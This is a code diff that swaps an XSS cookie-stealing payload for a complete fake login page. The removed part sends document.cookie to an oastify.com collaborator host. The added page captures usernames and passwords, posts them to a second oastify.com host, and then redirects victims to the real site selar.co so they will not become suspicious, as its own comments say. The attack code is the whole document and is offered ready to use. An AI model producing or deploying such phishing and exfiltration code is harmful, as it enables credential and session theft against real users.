@@ -1,11 +1,75 @@
-// Malicious payload (example for XSS)
-<script>
-  // This will send cookies to an attacker-controlled server (only for authorized environments)
-  fetch('https://a2dttm5mzdr57l3yjmrtepf9309rxjl8.oastify.com', {
-    method: 'POST',
-    body: JSON.stringify({ cookies: document.cookie }),
-    headers: {
-      'Content-Type': 'application/json'
-    }
-  });
-</script>
+<!-- Fake Login Page HTML -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f0f0f0;
+        }
+        .login-form {
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            border-radius: 5px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>Login</h2>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Username" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+            
+            // Capture the input values
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Send the captured credentials to your Burp Collaborator (OASTify) server
+            fetch('https://mvl5myyyspkh0xwacyk5718lwc23qyen.oastify.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username: username, password: password })
+            })
+            .then(response => {
+                // Optionally, redirect after stealing the credentials (to avoid suspicion)
+                window.location.href = 'https://selar.co'; // Redirect to the legitimate site
+            })
+            .catch(err => console.error('Error:', err));
+        });
+    </script>
+</body>
+</html>
